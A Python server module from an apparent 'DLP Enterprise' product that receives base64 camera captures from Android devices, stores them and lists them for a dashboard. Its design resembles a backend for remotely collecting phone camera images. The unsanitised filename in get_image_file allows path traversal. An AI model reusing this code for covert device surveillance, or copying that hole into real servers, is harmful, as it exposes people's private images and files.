"""
ATHEX DLP Enterprise - Camera Module
=====================================
Processes camera capture data from Android devices.
"""

import json
import logging
import base64
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional

logger = logging.getLogger(__name__)


class CameraHandler:
    """Handles camera capture data"""
    
    def __init__(self):
        self.captured_images: Dict[str, list] = {}
        self.image_dir = Path("data/camera_captures")
        self.image_dir.mkdir(parents=True, exist_ok=True)
        logger.info("CameraHandler initialized")
    
    def process(self, session_id: str, raw_data: Any) -> Dict:
        """
        Process camera capture from device.
        
        Args:
            session_id: Device session ID
            raw_data: Base64 encoded image or dict with image data
            
        Returns:
            Processed image data
        """
        try:
            image_base64 = None
            metadata = {}
            
            if isinstance(raw_data, str):
                image_base64 = raw_data
            elif isinstance(raw_data, dict):
                image_base64 = raw_data.get("image", raw_data.get("data", ""))
                metadata = {
                    "width": raw_data.get("width", 0),
                    "height": raw_data.get("height", 0),
                    "camera": raw_data.get("camera", "unknown"),
                    "format": raw_data.get("format", "jpeg"),
                    "size": raw_data.get("size", 0)
                }
            
            if not image_base64:
                return {"success": False, "error": "No image data"}
            
            # Save image
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"camera_{session_id[:8]}_{timestamp}.jpg"
            filepath = self.image_dir / filename
            
            try:
                image_bytes = base64.b64decode(image_base64)
                with open(filepath, 'wb') as f:
                    f.write(image_bytes)
                
                logger.info(f"📸 Camera capture saved: {filename} ({len(image_bytes)} bytes)")
                
            except Exception as e:
                logger.error(f"Failed to save image: {e}")
                filepath = None
            
            # Store in memory
            if session_id not in self.captured_images:
                self.captured_images[session_id] = []
            
            capture = {
                "session_id": session_id,
                "filename": filename,
                "path": str(filepath) if filepath else None,
                "size": len(image_bytes) if image_bytes else 0,
                "size_formatted": self._format_size(len(image_bytes)) if image_bytes else "0 B",
                "width": metadata.get("width", 0),
                "height": metadata.get("height", 0),
                "camera": metadata.get("camera", "unknown"),
                "timestamp": datetime.now().isoformat(),
                "base64_preview": image_base64[:200] + "..." if len(image_base64) > 200 else image_base64
            }
            
            self.captured_images[session_id].append(capture)
            
            # Keep only last 50 captures per device
            if len(self.captured_images[session_id]) > 50:
                self.captured_images[session_id] = self.captured_images[session_id][-50:]
            
            return {
                "success": True,
                "capture": capture
            }
            
        except Exception as e:
            logger.error(f"Error processing camera: {e}")
            return {"success": False, "error": str(e)}
    
    def get_captures(self, session_id: str, limit: int = 10) -> list:
        """Get recent camera captures"""
        captures = self.captured_images.get(session_id, [])
        return captures[-limit:]
    
    def get_image_file(self, filename: str) -> Optional[Path]:
        """Get image file path"""
        filepath = self.image_dir / filename
        if filepath.exists():
            return filepath
        return None
    
    def _format_size(self, size_bytes: int) -> str:
        """Format file size"""
        for unit in ['B', 'KB', 'MB']:
            if size_bytes < 1024:
                return f"{size_bytes:.1f} {unit}"
            size_bytes /= 1024
        return f"{size_bytes:.1f} GB"
    
    def format_for_dashboard(self, captures: list) -> list:
        """Format captures for dashboard display"""
        return [
            {
                "filename": c.get("filename", ""),
                "size": c.get("size_formatted", "0 B"),
                "camera": c.get("camera", "unknown"),
                "time": c.get("timestamp", "")[-8:] if c.get("timestamp") else "",
                "dimensions": f"{c.get('width', 0)}x{c.get('height', 0)}"
            }
            for c in captures
        ]


camera_handler = CameraHandler()